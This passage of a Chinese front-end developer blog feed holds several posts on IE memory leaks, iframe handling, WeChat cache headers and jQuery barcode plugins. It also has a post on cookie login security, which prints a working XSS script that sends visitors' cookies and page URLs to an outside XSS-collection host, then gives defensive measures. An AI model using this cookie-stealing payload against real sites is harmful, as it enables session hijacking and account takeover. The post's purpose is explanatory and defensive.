"asdfasdfasdf";&#125;这种方式相当于定义了5000个属性！解决方法：其实没什么解决方法就是编程的时候尽量避免出现这种情况咯~~&nbsp;说明：1、以上资料均来源于微软官方的MSDN站点大家可以到上面这个地址中看到详细的说明，包括范例和图例都有。只是我英文不太好，看不太懂，如果我上述有失误或有需要补充的地方请大家指出。2、对于第一条，事实上包括 element.onclick = funcRef 这种写法也算在其中，因为这也是一个对对象的引用。在页面onunload时应该释放掉。3、对于第三条，在MSDN的英文说明中好像是说即使调用detachEvent也无法释放内存，因为在attachEvent的时候就已经造成内存“LEAK”了，不过detachEvent后情况还是会好一点。不知道是不是这样，请英文好的亲能够指出。4、在实际编程中，这些内存问题的实际影响并不大，尤其是给客户使用时，客户对此绝不会有察觉，然而这些问题对于程序员来说却始终是个心病 — 有这样的BUG心里总会觉得不舒服吧？能解决则给与解决，这样是最好的。事实上我在webfx.eae.net这样顶级的JS源码站点中，在它们的源码里都会看到采用上述解决方式进行内存的释放管理。理解并解决IE的内存泄漏方式Web开发的发展在过去一些的时候，Web开发人员并没有太多的去关注内存泄露问题。那时的页面间联系大都比较简单，并主要使用不同的连接地址在同一个站点中导航，这样的设计方式是非常有利于浏览器释放资源的。即使Web页面运行中真的出现了资源泄漏，那它的影响也是非常有限而且常常是不会被人在意的。今天人们对Web应用有了高更的要求。一个页面很可能数小时不会发生URL跳转，并同时通过Web服务动态的更新页面内容。复杂的事件关联设计、基于对象的JScript和DHTML技术的广泛采用，使得代码的能力达到了其承受的极限。在这样的情况和改变下，弄清楚内存泄露方式变得非常的急迫，特别是过去这些问题都被传统的页面导航方法给屏蔽了。还算好的事情是，当你明确了希望寻找什么时，内存泄露方式是比较容易被确定的。大多数你能遇到的泄露问题我们都已经知道，你只需要少量额外的工作就会给你带来好处。虽然在一些页面中少量的小泄漏问题仍会发生，但是主要的问题还是很容易解决的。泄露方式在接下来的内容中，我们会讨论内存泄露方式，并为每种方式给出示例。其中一个重要的示例是JScript中的Closure技术，另一个示例是在事件执行中使用Closures。当你熟悉本示例后，你就能找出并修改你已有的大多数内存泄漏问题，但是其它Closure相关的问题可能又会被忽视。现在让我们来看看这些个方式都有什么：1、循环引用(Circular References) — IE浏览器的COM组件产生的对象实例和网页脚本引擎产生的对象实例相互引用，就会造成内存泄漏。这也是Web页面中我们遇到的最常见和主要的泄漏方式；2、内部函数引用(Closures) — Closures可以看成是目前引起大量问题的循环应用的一种特殊形式。由于依赖指定的关键字和语法结构，Closures调用是比较容易被我们发现的；3、页面交叉泄漏(Cross-Page Leaks) — 页面交叉泄漏其实是一种较小的泄漏，它通常在你浏览过程中，由于内部对象薄计引起。下面我们会讨论DOM插入顺序的问题，在那个示例中你会发现只需要改动少量的代码，我们就可以避免对象薄计对对象构建带来的影响；4、貌似泄漏(Pseudo-Leaks) — 这个不是真正的意义上的泄漏，不过如果你不了解它，你可能会在你的可用内存资源变得越来越少的时候极度郁闷。为了演示这个问题，我们将通过重写Script元素中的内容来引发大量内存的”泄漏”。循环引用循环引用基本上是所有泄漏的始作俑者。通常情况下，脚本引擎通过垃圾收集器(GC)来处理循环引用，但是某些未知因数可能会妨碍从其环境中释放资源。对于IE来说，某些DOM对象实例的状态是脚本无法得知的。下面是它们的基本原则：Figure 1: 基本的循环引用模型本模型中引起的泄漏问题基于COM的引用计数。脚本引擎对象会维持对DOM对象的引用，并在清理和释放DOM对象指针前等待所有引用的移除。在我们的示例中，我们的脚本引擎对象上有两个引用：脚本引擎作用域和DOM对象的expando属性。当终止脚本引擎时第一个引用会释放，DOM对象引用由于在等待脚本擎的释放而并不会被释放。你可能会认为检测并修复假设的这类问题会非常的容易，但事实上这样基本的的示例只是冰山一角。你可能会在30个对象链的末尾发生循环引用，这样的问题排查起来将会是一场噩梦。如果你仍不清楚这种泄漏方式在HTML代码里到底怎样，你可以通过一个全局脚本变量和一个DOM对象来引发并展现它。1234567891011121314151617181920212223&lt;html&gt;&lt;head&gt;&lt;script language="JScript"&gt;var myGlobalObject;function SetupLeak()&#123;// First set up the script scope to element referencemyGlobalObject = document.getElementById("LeakedDiv");// Next set up the element to script scope referencedocument.getElementById("LeakedDiv").expandoProperty = myGlobalObject;&#125;function BreakLeak()&#123;document.getElementById("LeakedDiv").expandoProperty = null;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="LeakedDiv"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;你可以使用直接赋null值得方式来破坏该泄漏情形。在页面文档卸载前赋null值，将会让脚本引擎知道对象间的引用链没有了。现在它将能正常的清理引用并释放DOM对象。在这个示例中，作为Web开发员的你因该更多的了解了对象间的关系。作为一个基本的情形，循环引用可能还有更多不同的复杂表现。对基于对象的JScript，一个通常用法是通过封装JScript对象来扩充DOM对象。在构建过程中，你常常会把DOM对象的引用放入JScript对象中，同时在DOM对象中也存放上对新近创建的JScript对象的引用。你的这种应用模式将非常便于两个对象之间的相互访问。这是一个非常直接的循环引用问题，但是由于使用不用的语法形式可能并不会让你在意。要破环这种使用情景可能变得更加复杂，当然你同样可以使用简单的示例以便于清楚的讨论。1234567891011121314151617181920212223242526272829&lt;html&gt;&lt;head&gt;&lt;script language="JScript"&gt;function Encapsulator(element)&#123;// Set up our elementthis.elementReference = element;// Make our circular referenceelement.expandoProperty = this;&#125;function SetupLeak()&#123;// The leak happens all at oncenew Encapsulator(document.getElementById("LeakedDiv"));&#125;function BreakLeak()&#123;document.getElementById("LeakedDiv").expandoProperty = null;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="LeakedDiv"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;更复杂的办法还有记录所有需要解除引用的对象和属性，然后在Web文档卸载的时候统一清理，但大多数时候你可能会再造成额外的泄漏情形，而并没有解决你的问题。闭包函数(Closures)由于闭包函数会使程序员在不知不觉中创建出循环引用，所以它对资源泄漏常常有着不可推卸的责任。而在闭包函数自己被释放前，我们很难判断父函数的参数以及它的局部变量是否能被释放。实际上闭包函数的使用已经很普通，以致人们频繁的遇到这类问题时我们却束手无策。在详细了解了闭包背后的问题和一些特殊的闭包泄漏示例后，我们将结合循环引用的图示找到闭包的所在，并找出这些不受欢迎的引用来至何处。Figure 2. 闭包函数引起的循环引用普通的循环引用，是两个不可探知的对象相互引用造成的，但是闭包却不同。代替直接造成引用，闭包函数则取而代之从其父函数作用域中引入信息。通常，函数的局部变量和参数只能在该被调函数自身的生命周期里使用。当存在闭包函数后，这些变量和参数的引用会和闭包函数一起存在，但由于闭包函数可以超越其父函数的生命周期而存在，所以父函数中的局部变量和参数也仍然能被访问。在下面的示例中，参数1将在函数调用终止时正常被释放。当我们加入了一个闭包函数后，一个额外的引用产生，并且这个引用在闭包函数释放前都不会被释放。如果你碰巧将闭包函数放入了事件之中，那么你不得不手动从那个事件中将其移出。如果你把闭包函数作为了一个expando属性，那么你也需要通过置null将其清除。同时闭包会在每次调用中创建，也就是说当你调用包含闭包的函数两次，你将得到两个独立的闭包，而且每个闭包都分别拥有对参数的引用。由于这些显而易见的因素，闭包确实非常用以带来泄漏。下面的示例将展示使用闭包的主要泄漏因素：123456789101112131415161718192021222324252627282930&lt;html&gt;&lt;head&gt;&lt;script language="JScript"&gt;function AttachEvents(element)&#123;// This structure causes element to ref ClickEventHandlerelement.attachEvent("onclick", ClickEventHandler);function ClickEventHandler()&#123;// This closure refs element&#125;&#125;function SetupLeak()&#123;// The leak happens all at onceAttachEvents(document.getElementById("LeakedDiv"));&#125;function BreakLeak()&#123;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="LeakedDiv"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;如果你对怎么避免这类泄漏感到疑惑，我将告诉你处理它并不像处理普通循环引用那么简单。”闭包”被看作函数作用域中的一个临时对象。一旦函数执行退出，你将失去对闭包本身的引用，那么你将怎样去调用detachEvent方法来清除引用呢？在Scott Isaacs的MSN Spaces上有一种解决这个问题的有趣方法。这个方法使用一个额外的引用(原文叫second closure，可是这个示例里致始致终只有一个closure)协助window对象执行onUnload事件，由于这个额外的引用和闭包的引用存在于同一个对象域中，于是我们可以借助它来释放事件引用，从而完成引用移除。为了简单起见我们将闭包的引用暂存在一个expando属性中，下面的示例将向你演示释放事件引用和清除expando属性。12345678910111213141516171819202122232425262728293031323334353637&lt;html&gt;&lt;head&gt;&lt;script language="JScript"&gt;function AttachEvents(element)&#123;// In order to remove this we need to put// it somewhere. Creates another refelement.expandoClick = ClickEventHandler;// This structure causes element to ref ClickEventHandlerelement.attachEvent("onclick", element.expandoClick);function ClickEventHandler()&#123;// This closure refs element&#125;&#125;function SetupLeak()&#123;// The leak happens all at onceAttachEvents(document.getElementById("LeakedDiv"));&#125;function BreakLeak()&#123;document.getElementById("LeakedDiv").detachEvent("onclick",document.getElementById("LeakedDiv").expandoClick);document.getElementById("LeakedDiv").expandoClick = null;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="LeakedDiv"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;在这篇KB文章中，实际上建议我们除非迫不得已尽量不要创建使用闭包。文章中的示例，给我们演示了非闭包的事件引用方式，即把闭包函数放到页面的全局作用域中。当闭包函数成为普通函数后，它将不再继承其父函数的参数和局部变量，所以我们也就不用担心基于闭包的循环引用了。在非必要的时候不使用闭包这样的编程方式可以尽量使我们的代码避免这样的问题。最后，脚本引擎开发组的Eric Lippert，给我们带来了一篇关于闭包使用通俗易懂的好文章。他的最终建议也是希望在真正必要的时候才使用闭包函数。虽然他的文章没有提及闭包会使用的真正场景，但是这儿已有的大量示例非常有助于大家起步。页面交叉泄漏(Cross-Page Leaks)这种基于插入顺序而常常引起的泄漏问题，主要是由于对象创建过程中的临时对象未能被及时清理和释放造成的。它一般在动态创建页面元素，并将其添加到页面DOM中时发生。一个最简单的示例场景是我们动态创建两个对象，并创建一个子元素和父元素间的临时域（译者注：这里的域(Scope)应该是指管理元素之间层次结构关系的对象）。然后，当你将这两个父子结构元素构成的的树添加到页面DOM树中时，这两个元素将会继承页面DOM中的层次管理域对象，并泄漏之前创建的那个临时域对象。下面的图示示例了两种动态创建并添加元素到页面DOM中的方法。在第一种方法中，我们将每个子元素添加到它的直接父元素中，最后再将创建好的整棵子树添加到页面DOM中。当一些相关条件合适时，这种方法将会由于临时对象问题引起泄漏。在第二种方法中，我们自顶向下创建动态元素，并使它们被创建后立即加入到页面DOM结构中去。由于每个被加入的元素继承了页面DOM中的结构域对象，我们不需要创建任何的临时域。这是避免潜在内存泄漏发生的好方法。Figure 3. DOM插入顺序泄漏模型接下来，我们将给出一个躲避了大多数泄漏检测算法的泄漏示例。因为我们实际上没有泄漏任何可见的元素，并且由于被泄漏的对象太小从而你可能根本不会注意这个问题。为了使我们的示例产生泄漏，在动态创建的元素结构中将不得不内联的包含一个脚本函数指针。在我们设置好这些元素间的相互隶属关系后这将会使我们泄漏内部临时脚本对象。由于这个泄漏很小，我们不得不将示例执行成千上万次。事实上，一个对象的泄漏只有很少的字节。在运行示例并将浏览器导航到一个空白页面，你将会看到两个版本代码在内存使用上的区别。当我们使用第一种方法，将子元素加入其父元素再将构成的子树加入页面DOM，我们的内存使用量会有微小的上升。这就是一个交叉导航泄漏，只有当我们重新启动IE进程这些泄漏的内存才会被释放。如果你使用第二种方法将父元素加入页面DOM再将子元素加入其父元素中，同样运行若干次后，你的内存使用量将不会再上升，这时你会发现你已经修复了交叉导航泄漏的问题。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;html&gt;&lt;head&gt;&lt;script language="JScript"&gt;function LeakMemory()&#123;var hostElement = document.getElementById("hostElement");// Do it a lot, look at Task Manager for memory responsefor(i = 0; i &lt; 5000; i++)&#123;var parentDiv =document.createElement("&lt;div onClick='foo()'&gt;");var childDiv =document.createElement("&lt;div onClick='foo()'&gt;");// This will leak a temporary objectparentDiv.appendChild(childDiv);hostElement.appendChild(parentDiv);hostElement.removeChild(parentDiv);parentDiv.removeChild(childDiv);parentDiv = null;childDiv = null;&#125;hostElement = null;&#125;function CleanMemory()&#123;var hostElement = document.getElementById("hostElement");// Do it a lot, look at Task Manager for memory responsefor(i = 0; i &lt; 5000; i++)&#123;var parentDiv =document.createElement("&lt;div onClick='foo()'&gt;");var childDiv =document.createElement("&lt;div onClick='foo()'&gt;");// Changing the order is important, this won't leakhostElement.appendChild(parentDiv);parentDiv.appendChild(childDiv);hostElement.removeChild(parentDiv);parentDiv.removeChild(childDiv);parentDiv = null;childDiv = null;&#125;hostElement = null;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;Memory Leaking Insert&lt;/button&gt;&lt;button&gt;Clean Insert&lt;/button&gt;&lt;div id="hostElement"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;这类泄漏应该被澄清，因为这个解决方法有悖于我们在IE中的一些有益经验。创建带有脚本对象的DOM元素，以及它们已进行的相互关联是了解这个泄漏的关键点。这实际上这对于泄漏来说是至关重要的，因为如果我们创建的DOM元素不包含任何的脚本对象，同时使用相同的方式将它们进行关联，我们是不会有任何泄漏问题的。示例中给出的第二种技巧对于关联大的子树结构可能更有效（由于在那个示例中我们一共只有两个元素，所以建立一个和页面DOM不相关的树结构并不会有什么效率问题）。第二个技巧是在创建元素的开始不关联任何的脚本对象，所以你可以安全的创建子树。当你把你的子树关联到页面DOM上后，再继续处理你需要的脚本事件。牢记并遵守关于循环引用和闭包函数的使用规则，你不会再在挂接事件时在你的代码中遇到不同的泄漏。我真的要指出这个问题，因为我们可以看出不是所有的内存泄漏都是可以很容易发现的。它们可能都是些微不足道的问题，但往往需要成千上万次的执行一个更小的泄漏场景才能使问题显现出来，就像DOM元素插入顺序引起的问题那样。如果你觉得使用所谓的”最佳”经验来编程，那么你就可以高枕无忧，但是这个示例让我们看到，即使是”最佳”经验似乎也可能带来泄漏。我们这里的解决方案希望能提高这些已有的好经验，或者介绍一些新经验使我们避免泄漏发生的可能。貌似泄漏(Pseudo-Leaks)在大多数时候，一些APIs的实际的行为和它们预期的行为可能会导致你错误的判断内存泄漏。貌似泄漏大多数时候总是出现在同一个页面的动态脚本操作中，而在从一个页面跳转到空白页面的时候发生是非常少见的。那你怎么能象排除页面间泄漏那样来排除这个问题，并且在新任务运行中的内存使用量是否是你所期望的。我们将使用脚本文本的重写来作为一个貌似泄漏的示例。象DOM插入顺序问题那样，这个问题也需要依赖创建临时对象来产生”泄漏”。对一个脚本元素对象内部的脚本文本一而再再而三的反复重写，慢慢地你将开始泄漏各种已关联到被覆盖内容中的脚本引擎对象。特别地，和脚本调试有关的对象被作为完全的代码对象形式保留了下来。123456789101112131415161718&lt;html&gt;&lt;head&gt;&lt;script language="JScript"&gt;function LeakMemory()&#123;// Do it a lot, look at Task Manager for memory responsefor(i = 0; i &lt; 5000; i++)&#123;hostElement.text = "function foo() &#123; &#125;";&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;button&gt;Memory Leaking Insert&lt;/button&gt;&lt;script id="hostElement"&gt;function foo() &#123; &#125;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;如果你运行上面的示例代码并使用任务管理器查看，当从”泄漏”页面跳转到空白页面时，你并不会注意到任何脚本泄漏。因为这种脚本泄漏完全发生在页面内部，而且当你离开该页面时被使用的内存就会回收。对于我们原本所期望的行为来说这样的情况是糟糕的。你希望当重写了脚本内容后，原来的脚本对象就应该彻底的从页面中消失。但事实上，由于被覆盖的脚本对象可能已用作事件处理函数，并且还可能有一些未被清除的引用计数。正如你所看到的，这就是貌似泄漏。在表面上内存消耗量可能看起来非常的糟糕，但是这个原因是完全可以接受的。&nbsp;总结每一位Web开发员可能都整理有一份自己的代码示例列表，当他们在代码中看到如列表中的代码时，他们会意识到泄漏的存在并会使用一些开发技巧来避免这些问题。这样的方法虽然简单便捷，但这也是今天Web页面内存泄漏普遍存在的原因。考虑我们所讨论的泄漏情景而不是关注独立的代码示例，你将会使用更加有效的策略来解决泄漏问题。这样的观念将使你在设计阶段就把问题估计到，并且确保你有计划来处理潜在的泄漏问题。使用编写加固代码（译者注：就是异常处理或清理对象等的代码）的习惯并且采取清理所有自己占用内存的方法。虽然对这个问题来说可能太夸张了，你也可能几乎从没有见到编写脚本却需要自己清理自己占用的内存的情况；使这个问题变得越来越显著的是，脚本变量和expando属性间存在的潜在泄漏可能。如果对模式和设计感兴趣，我强烈推荐Scott的这篇blog，因为其中演示了一个通用的移除基于闭包泄漏的示例代码。当然这需要我们使用更多的代码，但是这个实践是有效的，并且改进的场景非常容易在代码中定位并进行调试。类似的注入设计也可以用在基于expando属性引起的循环引用中，不过需要注意所注册的方法自身不要让泄漏(特别使用闭包的地方)跑掉。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>javascript内存泄漏</tag>
        <tag>javascript内存释放</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cookie存储用户信息安全防范（防止模拟登录）]]></title>
    <url>%2F2016%2F04%2F07%2Fcookie%E5%AD%98%E5%82%A8%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%98%B2%E8%8C%83%EF%BC%88%E9%98%B2%E6%AD%A2%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一般的菜鸟只知道把用户信息保存到Cookie即可，登录只管判断Cookie是否存在，凭借着cookie值的存在情况来判断用户是否登录，更有一些甚至把用户密码也保存在Cookie中，这是极其危险的，人家要搞你分分钟可以模拟你的Cookie来登录你的用户，做一些危险的事情。1、攻击者怎么拿到你的登录的Cookie值。现在各种攻击技术，目前我只了解XSS攻击方式，做过一个XSS攻击的测试，他在一网站里面发布了一篇博客，里面嵌入了XSS攻击脚步，脚步代码如下：123456789101112131415161718192021222324252627282930(function() &#123; (new Image()).src = 'http://xss.sssie.com/index.php?do=api&amp;amp;id=RQTPpx&amp;amp;location=' + escape((function() &#123;try &#123;return document.location.href&#125; catch(e) &#123;return ''&#125;&#125;)()) + '&amp;amp;toplocation=' + escape((function() &#123;try &#123;return top.location.href&#125; catch(e) &#123;return ''&#125;&#125;)()) + '&amp;amp;cookie=' + escape((function() &#123;try &#123;return document.cookie&#125; catch(e) &#123;return ''&#125;&#125;)()) + '&amp;amp;opener=' + escape((function() &#123;try &#123;return (window.opener &amp;amp;&amp;amp; window.opener.location.href) ? window.opener.location.href: ''&#125; catch(e) &#123;return ''&#125;&#125;)());&#125;)();if ('' == 1) &#123;keep = new Image();keep.src = 'http://xss.sssie.com/index.php?do=keepsession&amp;amp;id=RQTPpx&amp;amp;url=' + escape(document.location) + '&amp;amp;cookie=' + escape(document.cookie)&#125;;这段代码，是通过第三方XSS平台来的，不过目前有许多的免费XSS平台，自己也可以搭建一个。通过嵌入以上脚步，只要用户登录了自己的帐号，一旦浏览了攻击者发布的博客，即攻击成功，XSS第三方平台里面发送有关我登录的Cookie 给攻击者，这样你登录的Cookie值立马给窃取，是不是很危险呢？2、攻击者模拟Cookie登录做过后台开发的人都知道怎么模拟Cookie信息去登录，除非是菜鸟，这个我就不多说了，不过不会后台开发的人，会使用一些工具，比如Fiddler 就很容易把Cookie信息模拟登录了，这里就不一一讲述实现过程了仅仅通过简单的模拟用户的Cookie就可以分分种使用你的帐号登录了，并做一些危险的动作，比如删除你的东西，以及更多危险的操作。到了这里是不是觉得很危险？接下来我来讲述怎么防止这种模拟以下讲述两点防止的方法：1、网站本身做一些脚步拦截，以及脚步检验工作比如web站点使用过富文本，一般富文本默认都会对脚本进行拦截，但是有些需要是需要开启这个用户引用脚步的，针对这些就的对用户输入引用的脚本做安全的验证工作，检查风险性，对于风险脚步进行拦截处理，不让提交等。这样就可以在用户输入层避免了XSS攻击的来源了2、Cookie层本身做正确性校验后台判断是否登录做严格的验证校验工作，不仅仅只判断Cookie是否存在，而要做严格的正确性验证，这里我提供以下IP校验的方式来验证是否是有效登录。可以把用户请求的IP值和用户的唯一ID做一个特殊加密处理，这样Cookie信息中包含了用户登录的IP地址，这是很多大型网站都是这样做的安全登录，大家应该见过一些金融产品，如果换了一个网络，是不是提示要重新登录呢？这就是根据IP地址校验来防止攻击。Cookie值中保存了用户的IP值，这样每次登录的时候判断IP地址和当前请求的IP地址是否一致，如果一致则通过验证，IP不一致则说明是异常登录，验证不通过。总结：目前Cookie模拟登录安全防范就已经完结了，谢谢大家的支持，]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>cookie存储用户信息安全防范</tag>
        <tag>cookie防止模拟登录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iframe内存释放和高度自适应]]></title>
    <url>%2F2016%2F04%2F06%2Fiframe%E5%86%85%E5%AD%98%E9%87%8A%E6%94%BE%E5%92%8C%E9%AB%98%E5%BA%A6%E8%87%AA%E9%80%82%E5%BA%94%2F</url>
    <content type="text"><![CDATA[一、iframe内存释放相关资料称IE在iframe元素的回收方面存在着bug，在通常情况下应该将该元素的src属性值修改为”abort:blank”，并手工将其从 DOM树上移除，然后把脚本中引用它的变量置空并调用CollectGarbage()就可以避免iframe不能正常回收所造成的内存泄露。123456789101112131415161718192021222324252627282930313233343536function clearRAM() &#123; var frame = document.getElementById("ifr_content"); frame.src = 'about:blank'; frame.contentWindow.document.write( '');//清空frame的内容 frame.contentWindow.document.clear(); frame.contentWindow.close(); //避免frame内存泄漏 if (navigator.userAgent.indexOf('MSIE') &gt;= 0) &#123; if (CollectGarbage) &#123; CollectGarbage(); //IE 特有 释放内存 //删除原有标记 var tags = document.getElementById("ifrSet"); tags.removeChild(frame); //添加frameset框架 var _frame = document.createElement('frame'); _frame.src = ''; _frame.name = 'content'; _frame.id = 'ifr_content'; tags.appendChild(_frame); &#125; &#125; &#125;//主动释放 5秒一次setInterval( function() &#123; if (navigator.userAgent.indexOf('MSIE') &gt;= 0) &#123; if (CollectGarbage) &#123; //alert(1) CollectGarbage(); //IE 特有 释放内存 &#125; &#125;&#125;, 5000);二、iframe高度自适应很多人一直被iframe的高度自适应的问题困扰着，在项目中也是多次遇到。网上也有不少相关的代码，但是总不能满足自己的要求。本代码主要解决的问题是：最外层滚动条随着iframe高度动态变化的问题。如果iframe高度比较大最外层就会出现滚动条，否则就不会。网上好多例子的问题都是iframe只保留最大的高度以至于页面内容高度很小但是右边还有滚动条。兼容性：谷歌、火狐、ie8+1234567891011121314151617181920212223/** * iframe自适应高度，height为手动设置的最小高度 */function initIframeHeight(height)&#123; var userAgent = navigator.userAgent; var iframe = parent.document.getElementById("contentIframe"); var subdoc = iframe.contentDocument || iframe.contentWindow.document; var subbody = subdoc.body; var realHeight; //谷歌浏览器特殊处理 if(userAgent.indexOf("Chrome") &gt; -1)&#123; realHeight = subdoc.documentElement.scrollHeight; &#125; else&#123; realHeight = subbody.scrollHeight; &#125; if(realHeight &lt; height)&#123; $(iframe).height(height); &#125; else&#123; $(iframe).height(realHeight); &#125;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>iframe内存释放</tag>
        <tag>iframe高度自适应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery获取鼠标移动方向特效]]></title>
    <url>%2F2016%2F04%2F06%2Fjquery%E8%8E%B7%E5%8F%96%E9%BC%A0%E6%A0%87%E7%A7%BB%E5%8A%A8%E6%96%B9%E5%90%91%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[效果图：查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jQuery获取鼠标移动方向特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3按钮多种移入动画(按钮悬停特效)]]></title>
    <url>%2F2016%2F04%2F06%2Fcss3%E6%8C%89%E9%92%AE%E5%A4%9A%E7%A7%8D%E7%A7%BB%E5%85%A5%E5%8A%A8%E7%94%BB%E6%8C%89%E9%92%AE%E6%82%AC%E5%81%9C%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[演示效果：查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>CSS3按钮多种移入动画</tag>
        <tag>CSS3按钮多种移入效果</tag>
        <tag>CSS3按钮悬停特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[清除微信浏览器缓存]]></title>
    <url>%2F2016%2F03%2F25%2F%E6%B8%85%E9%99%A4%E5%BE%AE%E4%BF%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;做移动web开发免不了用微信扫描页面来进行调试，android版微信浏览器一直都默认缓存html静态资源，每次静态资源变化甚至新内容发布的时候在微信浏览器上都极有可能不能更新，很多时候要清理微信缓存才能看到效果，很是烦人。部分客户装了QQ浏览器，微信实际调用的是QQ浏览器，有时候甚至光清理微信缓存都无效，QQ浏览器的缓存也要清。解决方案是在调试阶段或者频繁更新的页面加入以下头信息：123&lt;meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" /&gt;&lt;meta http-equiv="Pragma" content="no-cache" /&gt;&lt;meta http-equiv="Expires" content="0" /&gt;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>清除微信浏览器缓存</tag>
        <tag>清除手机端浏览器缓存</tag>
        <tag>清除移动端浏览器缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jquery-barcode.js绘制条码生成打印插件]]></title>
    <url>%2F2016%2F03%2F24%2Fjquery-barcode-js%E7%BB%98%E5%88%B6%E6%9D%A1%E7%A0%81%E7%94%9F%E6%88%90%E6%89%93%E5%8D%B0%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[query-barcode.js 条形码插件官方下载，barcode-coder ，一款优秀的 barcode 条形码插件，可以实现任一效果条形码的在线生成。jQuery 条形码插件可以自定义条形码颜色、背景颜色、高度与宽度，jQuery barcode plugin 还可以方便地设置字符串或/和数字信息到条形码中，得到标准、美观、规范的显示。javascript绘制条形码/二维码，居于jquery的实现，示例和API如下，翻译来源：http://barcode-coder.com/en/barcode-jquery-plugin-201.htmljquery绘制条形码/二维码插件jquery.barcode.js API文档和使用说明如下1）query.barcode.js导入同其他jquery插件一样，只需要将jquery框架和jquery.barcode.js导入页面即可。12&lt;script type="text/javascript" src="jquery-1.8.2.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="jquery-barcode.js"&gt;&lt;/script&gt;&nbsp;2）jquery.barcode.js使用方法2.1）定义一个DOM对象作为条形码/二维码的容器1&lt;div id="bcTarget"&gt;&lt;/div&gt;&nbsp;2.2）使用javascript调用jquery.barcode.js绘制条形码/二维码1$("#bcTarget").barcode("1234567890128", "ean13");&nbsp;jquery对象扩展方法barcode参数说明：barcode: function(datas, type, settings)datas参数支持2种类型string：要绘制的条形码字符串内容（依赖于条形码的类型）。如果条形码类型能容纳这些字符，并且存在校验不是强制性的，字符串的ISE将会自动计算（原文：If barcode type include it, the presence of the checksum is not mandatory, it ise automatically recalculated）objecttype (string)：条形码类型codabarcode11 (code 11)code39 (code 39)code93 (code 93)code128 (code 128)ean8 (ean 8)ean13 (ean 13)std25 (standard 2 of 5 - industrial 2 of 5)int25 (interleaved 2 of 5)msidatamatrix (ASCII + extended)settings (object)：条形码样式的配置示例代码123456789101112&lt;script type="text/javascript" src="http://barcode-coder.com/js/jquery-1.3.2.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="http://barcode-coder.com/js/jquery-barcode-last.min.js"&gt;&lt;/script&gt;&lt;div id="bcTarget1"&gt;&lt;/div&gt;&lt;div id="bcTarget2"&gt;&lt;/div&gt;&lt;div id="bcTarget3"&gt;&lt;/div&gt;&lt;script&gt;window.onload = function () &#123;$("#bcTarget1").barcode("NF98768574", "code128", &#123; barWidth: 2, barHeight: 30 &#125;);$("#bcTarget2").barcode("1234567890128", "code128", &#123; barWidth: 2, barHeight: 30 &#125;);$("#bcTarget3").barcode("ABC12345611", "code128", &#123; barWidth: 2, barHeight: 30 &#125;);&#125;&lt;/script&gt;&nbsp;DEMO演示&nbsp;DEMO演示图片：&nbsp;DEMO下载（jquery-barcode）&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jquery-barcode.js</tag>
        <tag>jQuery生成二维码</tag>
        <tag>jQuery生成条码</tag>
        <tag>jQuery绘制条码</tag>
        <tag>jq生成二维码</tag>
        <tag>jq生成条码</tag>
        <tag>jq绘制条码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨浏览器复制粘贴插件-ZeroClipboard快速入门详解(JS复制粘贴功能)]]></title>
    <url>%2F2016%2F03%2F22%2F%E8%B7%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E5%A4%8D%E5%88%B6%E7%A5%9E%E5%99%A8zeroclipboard%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3js%E5%A4%8D%E5%88%B6%E5%8A%9F%E8%83%BD%2F</url>
